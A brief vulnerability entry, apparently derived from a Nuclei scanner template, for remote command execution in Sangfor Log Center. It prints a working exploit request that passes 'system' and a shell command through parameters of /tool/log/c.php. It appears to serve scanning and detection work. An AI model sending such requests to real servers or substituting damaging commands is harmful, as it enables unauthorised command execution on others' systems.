# Vulnerability: Sangfor Log Center - Remote Command Execution
**Classification:** SANGFOR
**Source:** Nuclei Template (`sangfor-cphp-rce.yaml`)

## Description
Sangfor Log Center is vulnerable to RCE.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/tool/log/c.php?strip_slashes=system&host=ipconfig
```

